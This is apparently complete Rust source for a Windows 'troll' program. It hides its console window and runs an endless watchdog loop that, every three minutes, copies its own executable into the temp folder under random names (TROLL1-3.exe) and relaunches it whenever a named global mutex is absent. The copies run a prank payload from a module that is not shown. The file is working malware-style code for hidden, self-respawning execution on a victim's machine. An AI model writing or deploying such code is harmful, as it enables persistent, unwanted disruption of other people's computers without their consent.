#![windows_subsystem = "windows"]

mod troll;
use rand::{Rng, thread_rng};
use std::{env, fs, process::Command, ptr::null_mut, thread::sleep, time::Duration};
use troll::troll_script;
use windows_sys::Win32::Foundation::{CloseHandle, ERROR_ALREADY_EXISTS, GetLastError};
use windows_sys::Win32::System::Threading::{CreateMutexW, OpenMutexW, PROCESS_SYNCHRONIZE};

const CLONE_NAMES: [&'static str; 3] = ["TROLL1.exe", "TROLL2.exe", "TROLL3.exe"];
const SECRET_MUTEX: &str = "Global\\MyUniqueTrollLock\0";
const SYNCHRONIZE: u32 = 0x00100000;

fn to_utf16(text: &str) -> Vec<u16> {
    return text.encode_utf16().collect::<Vec<u16>>();
}

fn main() {
    let exe_lies = env::current_exe().unwrap();
    if let (Some(exe_name), Some(exe_path)) = (exe_lies.file_name(), exe_lies.to_str()) {
        let name = exe_name.to_str().unwrap();
        if CLONE_NAMES.contains(&name) {
            let mutex_name = to_utf16(SECRET_MUTEX);
            let handle = unsafe {
                let h = CreateMutexW(null_mut(), 1, mutex_name.as_ptr());
                if GetLastError() == ERROR_ALREADY_EXISTS {
                    return;
                }
                h
            };

            troll_script();
            unsafe {
                CloseHandle(handle);
            }
        } else {
            let mutex_name = to_utf16(SECRET_MUTEX);
            loop {
                let mut rng = thread_rng();
                unsafe {
                    let h = OpenMutexW(SYNCHRONIZE, 0, mutex_name.as_ptr());

                    if h == 0 {
                        let mut new_path = env::temp_dir();
                        let new_index_name = rng.gen_range(0..CLONE_NAMES.len());
                        let target_name = format!("{}", CLONE_NAMES[new_index_name]);
                        new_path.push(target_name);

                        if fs::copy(&exe_path, &new_path).is_ok() {
                            Command::new(&new_path).spawn().ok();
                        }
                    } else {
                        CloseHandle(h);
                    }
                }
                sleep(Duration::from_mins(3));
            }
        }
    }
}
